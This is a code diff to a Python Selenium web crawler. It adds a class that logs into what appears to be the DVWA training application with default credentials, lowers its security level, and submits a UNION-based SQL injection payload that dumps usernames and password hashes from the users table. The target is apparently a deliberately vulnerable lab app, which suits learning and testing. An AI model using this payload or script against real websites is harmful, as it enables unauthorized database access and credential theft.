@@ -6,6 +6,9 @@ from bs4 import BeautifulSoup
 from collections import deque
 from pyvirtualdisplay import Display
 from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait, Select
+from selenium.webdriver.support import expected_conditions as EC
 from urllib.parse import urldefrag, urljoin
 
 from exceptions import (
@@ -17,25 +20,21 @@ from exceptions import (
 class Crawler(object):
     """
     A Crawler that finds documents that have certain 
-    characteristics.
+    characteristics. It was designed to be extendable and
+    used in simpler cases.
+    It needs a lot of work there is too many edge cases to cover 
     """
     allow_external_urls = False
 
-    def __init__(self, db, base_url=None, initial_path='', levels=1):
+    def __init__(self, base_url=None, initial_path='', levels=1):
         """Setup and validate arguments to make them available 
-        
-        Arguments:
-            db  -- MongoDB connection
         
         Keyword Arguments:
             initial_path {str} -- URL (default: {None})
             base_url {str} -- URL (default: {None})
             levels {int} -- Number of levels to crawl (default: {1})
         """
-
-        if not db:
-            raise(ImproperlyConfigured('database connection'))
-        elif not base_url:
+        if not base_url:
             raise(ImproperlyConfigured('base url'))
         elif not int(levels):
             raise(ValueError(int))
@@ -140,7 +139,51 @@ class Crawler(object):
         except queue.Empty:
             self.display.stop()
             return True
-        
+
+
+class VulnerabilitiesCrawler(Crawler):
+    def _setup(self):
+        """
+        General setup for the image without a database
+        """
+        _url = self.base_url
+        self.browser.get(_url)
+        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.NAME, "username")))
+        username = self.browser.find_element_by_name("username")
+        password = self.browser.find_element_by_name("password")
+        username.send_keys("admin")
+        password.send_keys("password")
+        self.browser.find_element_by_xpath("//input[@type='submit']").click()
+        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.NAME, "create_db")))
+        self.browser.find_element_by_xpath("//input[@type='submit']").click()
+        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.NAME, "username")))
+        username = self.browser.find_element_by_name("username")
+        password = self.browser.find_element_by_name("password")
+        username.send_keys("admin")
+        password.send_keys("password")
+        self.browser.find_element_by_xpath("//input[@type='submit']").click()
+        WebDriverWait(self.browser, 100).until(EC.presence_of_element_located((By.CSS_SELECTOR, ".menuBlocks")))
+        self.browser.get(_url + 'security.php')
+        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, ".menuBlocks")))
+        select = Select(self.browser.find_element_by_xpath("//select[@name='security']"))
+        select.select_by_visible_text('Low')
+        button = self.browser.find_element_by_xpath("//input[@name='seclev_submit']")
+        button.click()
+        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, ".menuBlocks")))
+        self.queue.put(_url + 'vulnerabilities/sqli/')
+
+    def run(self):
+        _url = self.queue.get()
+        self.browser.get(_url)
+        # start test
+        input = self.browser.find_element_by_xpath("//input[@name='id']")
+        query = r"%' and 1=0 union select null, concat(user,':',password) from users #"
+        input.send_keys(query)
+        button = self.browser.find_element_by_xpath("//input[@name='Submit']")
+        button.click()
+        # return username and password
+        info = self.browser.find_element_by_xpath("//*[@id='main_body']/div/div/pre[1]")
+        return(info.get_attribute('innerHTML'))
 
 
 
